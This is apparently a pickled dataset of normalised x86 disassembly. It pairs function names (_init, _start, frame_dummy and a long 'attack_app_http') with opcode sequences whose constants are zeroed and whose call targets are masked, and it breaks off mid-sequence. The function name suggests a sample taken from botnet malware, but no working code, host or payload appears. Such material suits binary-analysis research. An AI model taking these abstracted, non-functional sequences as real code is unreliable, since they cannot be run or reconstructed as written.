(lp0
(S'_init'
p1
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EBX\nCALL~FOO\nADD~EBX,0\nCALL~FOO\nCALL~FOO\nPOP~EBX\nPOP~EBP\nRETN"'
p2
L28L
tp3
a(S'__do_global_dtors_aux'
p4
S'"PUSH~EBP\nMOV~EBP,ESP\nSUB~ESP,0\nCMP~<STR>,0\nJZ~FOO\nJMP~FOO\nADD~EAX,0\nMOV~<STR>,EAX\nCALL~EDX\nMOV~EAX,<STR>\nMOV~EDX,[EAX]\nTEST~EDX,EDX\nJNZ~FOO\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~<STR>,0\nLEAVE\nRETN"'
p5
L72L
tp6
a(S'frame_dummy'
p7
S'"PUSH~EBP\nMOV~EAX,0\nMOV~EBP,ESP\nSUB~ESP,0\nCALL~FOO\nPOP~EDX\nADD~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EAX,<STR>\nTEST~EAX,EAX\nJZ~FOO\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~EAX\nADD~ESP,0\nLEAVE\nRETN"'
p8
L81L
tp9
a(S'_start'
p10
S'"XOR~EBP,EBP\nPOP~ESI\nMOV~ECX,ESP\nAND~ESP,0\nPUSH~EAX\nPUSH~ESP\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~ECX\nPUSH~ESI\nPUSH~0\nCALL~FOO"'
p11
L33L
tp12
a(S'attack_app_http'
p13
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOV~DL,[ESP+0]\nAND~EDX,0\nMOV~ESI,EDX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~EDX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~EDI,EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AX\nLEA~EAX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~ECX,[ESP+0]\nADD~ECX,EDX\nMOV~DL,[ECX]\nLEA~EAX,[EDX-0]\nCMP~AL,0\nJA~FOO\nLEA~EAX,[EDX-0]\nMOV~[ECX],AL\nINC~[ESP+0]\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EDX,[ESP+0]\nADD~ESP,0\nCMP~EAX,EDX\nJG~FOO\nMOV~[ESP+0],EDI\nCMP~EDI,0\nJLE~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nMOV~ESI,EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~[ESP+0],0\nJLE~FOO\nMOV~[ESP+0],0\nMOV~EBP,ESI\nMOV~[ESI+0],0\nMOV~DWORDPTR[ESI],0\nMOV~EAX,0\nMOV~AL,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ECX,EAX\nMOV~EAX,EDX\nSAR~EDX,0\nIDIV~,ECX\nLEA~EDX,[EDX+EDX*2]\nMOV~EAX,[ESP+0]\nLEA~EDI,[EAX+EDX*8]\nMOV~[ESP+0],ESI\nMOV~EAX,[EDI+0]\nMOV~[ESI+0],EAX\nLEA~EDX,[ESI+0]\nMOV~[ESP+0],EDX\nSUB~ESP,0\nPUSH~[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nCMP~[ESI+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESI+0],0\nADD~ESP,0\nSUB~ESP,0\nPUSH~[ESP+0]\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~[ESP+0]\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~[ESP+0]\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[EDI+0],0\nJA~FOO\nMOV~EBX,[EDI+0]\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nCALL~FOO\nMOV~ECX,0\nMOV~CL,[EDI+0]\nSHR~EAX,CL\nADD~EAX,EBX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~ECX,[ESP+0]\nMOV~[ECX+0],EAX\nCALL~FOO\nMOV~EBX,EAX\nMOV~ECX,0\nMUL~,ECX\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EDX\nMOV~EDX,[ESP+0]\nSHR~EDX,0\nLEA~EDX,[EDX+EDX*4]\nMOV~EAX,EBX\nSUB~EAX,EDX\nCMP~EAX,0\nJA~FOO\nJMP~<STR>\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nCALL~FOO\nINC~[ESP+0]\nADD~ESI,0\nADD~ESP,0\nMOV~EDX,[ESP+0]\nCMP~[ESP+0],EDX\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~EAX,0\nMOV~EDX,0\nLEA~EDI,[ESP+0]\nMOV~ECX,EDX\nCLD\nSTOSD~,\nLEA~EDI,[ESP+0]\nMOV~ECX,EDX\nCLD\nSTOSD~,\nADD~ESP,0\nCMP~[ESP+0],0\nJLE~FOO\nMOV~EDI,[ESP+0]\nADD~EDI,0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nLEA~EBP,[EDI-0]\nMOV~[ESP+0],EDI\nMOV~AL,[EDI-0]\nCMP~AL,0\nJNZ~FOO\nCMP~[EDI+0],0\nJZ~FOO\nMOV~[EDI-0],0\nJMP~FOO\nMOV~EAX,[ESP+0]\nMOV~[EAX-0],0\nJMP~FOO\nTEST~AL,AL\nJNZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~EBX,EDI\nMOV~EAX,[EDI-0]\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[EBX-0],EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~[EBX-0]\nCALL~FOO\nMOV~[ESP+0],0\nMOV~DWORDPTR[ESP],0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[EBX-0]\nCALL~FOO\nMOV~[ESP+0],0\nMOV~EAX,[EDI]\nMOV~[ESP+0],EAX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ESP+0],AX\nMOV~EDX,[ESP+0]\nMOV~[EBX-0],EDX\nMOV~ECX,[ESP+0]\nMOV~[ECX-0],0\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[EBX-0]\nCALL~FOO\nMOV~EAX,[EBX-0]\nMOV~EDX,EAX\nSHR~EDX,0\nAND~EAX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[EBX-0]\nADD~ESP,0\nCMP~[ESP+0],EAX\nJGE~FOO\nINC~EAX\nMOV~[ESP+0],EAX\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~EAX,[ESP+0]\nSUB~EAX,[EDI-0]\nCMP~EAX,0\nJBE~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX-0],0\nSUB~ESP,0\nPUSH~[EDI-0]\nCALL~FOO\nMOV~[EDI-0],0\nADD~ESP,0\nJMP~FOO\nMOV~EAX,[EDI-0]\nMOV~EDX,EAX\nSHR~EDX,0\nAND~EAX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[EDI-0]\nCMP~[ESP+0],EAX\nJGE~FOO\nINC~EAX\nMOV~[ESP+0],EAX\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~[ESP+0],EDI\nMOV~[EDI+0],0\nMOV~[EDI+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[EDI+0],0\nADD~ESP,0\nPUSH~0\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nLEA~ECX,[EBP+0]\nMOV~[ESP+0],ECX\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~[ESP+0]\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[EBP+0]\nPUSH~EDX\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[EBP+0]\nPUSH~EDX\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[EBP+0]\nPUSH~EDX\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[ESI+EBX]\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~[EAX+0],0\nJLE~FOO\nSUB~ESP,0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~ECX,[ESP+0]\nLEA~EAX,[ECX+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~[EAX+0],0\nJLE~FOO\nMOV~EBX,0\nLEA~ESI,[ESP+0]\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EBX\nSHL~EDX,0\nLEA~EDX,[EDX+EBP+0]\nPUSH~EDX\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~EBX,[ESP+0]\nINC~EBX\nMOV~[ESP+0],EBX\nADD~ESP,0\nMOV~EDX,[ESP+0]\nCMP~[EDX+0],EBX\nJG~FOO\nSUB~ESP,0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[EBX+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~[ESP+0]\nLEA~EAX,[EBX+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nLEA~EBX,[EBP+0]\nSUB~ESP,0\nPUSH~EBX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nSUB~ESP,0\nPUSH~EBX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPUSH~0\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~EDX,[ESP+0]\nPUSH~[EDX-0]\nCALL~FOO\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ECX-0],EAX\nMOV~EDX,[ESP+0]\nMOV~[EDX-0],0\nMOV~EAX,[ECX-0]\nMOV~EDX,EAX\nSHR~EDX,0\nAND~EAX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[ECX-0]\nADD~ESP,0\nCMP~EAX,[ESP+0]\nJLE~FOO\nINC~EAX\nMOV~[ESP+0],EAX\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~EAX,[EDI-0]\nMOV~EDX,EAX\nSHR~EDX,0\nAND~EAX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[EDI-0]\nCMP~EAX,[ESP+0]\nJLE~FOO\nINC~EAX\nMOV~[ESP+0],EAX\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~EAX,[EDI-0]\nMOV~EDX,EAX\nSHR~EDX,0\nAND~EAX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[EDI-0]\nCMP~EAX,[ESP+0]\nJLE~FOO\nINC~EAX\nMOV~[ESP+0],EAX\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~EAX,[EDI-0]\nMOV~EDX,EAX\nSHR~EDX,0\nAND~EAX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[EDI-0]\nCMP~EAX,[ESP+0]\nJLE~FOO\nINC~EAX\nMOV~[ESP+0],EAX\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~ECX,[ESP+0]\nMOV~[ECX-0],0\nSUB~ESP,0\nPUSH~[EDI-0]\nCALL~FOO\nMOV~[EDI-0],0\nADD~ESP,0\nJMP~FOO\nMOV~EAX,[ESP+0]\nMOV~[EAX-0],0\nSUB~ESP,0\nPUSH~[EDI-0]\nCALL~FOO\nMOV~[EDI-0],0\nADD~ESP,0\nINC~[ESP+0]\nADD~EDI,0\nMOV~EDX,[ESP+0]\nCMP~[ESP+0],EDX\nJNZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nTEST~EBX,EBX\nJLE~FOO\nMOV~ECX,[ESP+0]\nADD~ECX,0\nMOV~[ESP+0],ECX\nMOV~[ESP+0],0\nMOV~EAX,[ESP+0]\nSUB~EAX,0\nMOV~[ESP+0],EAX\nMOV~EDI,[ESP+0]\nMOV~ECX,[EDI-0]\nCMP~ECX,0\nJZ~FOO\nMOV~EAX,ECX\nAND~EAX,0\nMOV~EDX,ECX\nSHR~EDX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nOR~EAX,[ESP+0]\nJNZ~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX-0],0\nJMP~FOO\nSUB~ESP,0\nPUSH~[EDI-0]\nCALL~FOO\nMOV~[EDI-0],0\nMOV~ECX,[ESP+0]\nMOV~[ECX-0],0\nADD~ESP,0\nJMP~FOO\nMOV~EAX,[EDI-0]\nMOV~EDX,EAX\nAND~EDX,0\nSHR~EAX,0\nBT~[ESP+EAX*4+0],EDX\nSETB~DL\nTEST~DL,DL\nJZ~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~AL,[EAX-0]\nCMP~AL,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[EDI-0]\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nTEST~EAX,EAX\nJG~FOO\nSUB~ESP,0\nPUSH~[EDI-0]\nCALL~FOO\nMOV~[EDI-0],0\nMOV~EDX,[ESP+0]\nMOV~[EDX-0],0\nADD~ESP,0\nJMP~FOO\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nCMP~[ESP+0],0\nJLE~FOO\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+EAX+0],0\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~DWORDPTR[EDI],0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~DWORDPTR[EDI],0\nMOV~[EDI+0],0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nCMP~[ESP+EAX+0],0\nSETZ~AL\nAND~EAX,0\nADD~EBX,EAX\nLEA~ESI,[ESP+EBX+0]\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nSUB~EAX,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~EDX,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EDX,0\nLEA~EAX,[ESP+0]\nADD~EAX,EBX\nMOV~[EAX+EDX-0],0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~[EDI+0],0\nMOV~[EDI+0],0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nCMP~[ESP+EAX+0],0\nSETZ~AL\nAND~EAX,0\nADD~EBX,EAX\nLEA~ESI,[ESP+EBX+0]\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nSUB~EAX,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~EDX,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EDX,0\nLEA~EAX,[ESP+0]\nADD~EAX,EBX\nMOV~[EAX+EDX-0],0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~[EDI+0],0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nCMP~[ESP+EAX+0],0\nSETZ~AL\nAND~EAX,0\nADD~EBX,EAX\nLEA~ESI,[ESP+EBX+0]\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nSUB~EAX,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~EDX,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EDX,0\nLEA~EAX,[ESP+0]\nADD~EAX,EBX\nMOV~[EAX+EDX-0],0\nSUB~ESP,0\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[EDI+0],EAX\nADD~ESP,0\nJMP~FOO\nMOV~[EDI+0],0\nMOV~[ESP+0],0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~EBP,EAX\nLEA~EAX,[ESP+0]\nADD~EAX,[ESP+0]\nADD~ESP,0\nCMP~[EAX+EBP-0],0\nSETZ~AL\nAND~EAX,0\nADD~EBP,EAX\nMOV~EAX,[ESP+0]\nSUB~EAX,[ESP+0]\nSUB~EAX,EBP\nMOV~[ESP+0],EAX\nADD~EBX,EBP\nMOV~[ESP+0],EBX\nPUSH~0\nPUSH~0\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~EAX,[ESP+0]\nADD~EAX,EBP\nMOV~[ESP+0],EAX\nLEA~ESI,[ESP+EAX+0]\nCMP~EBX,0\nJLE~FOO\nSUB~EBX,0\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nCALL~FOO\nLEA~EBX,[EAX-0]\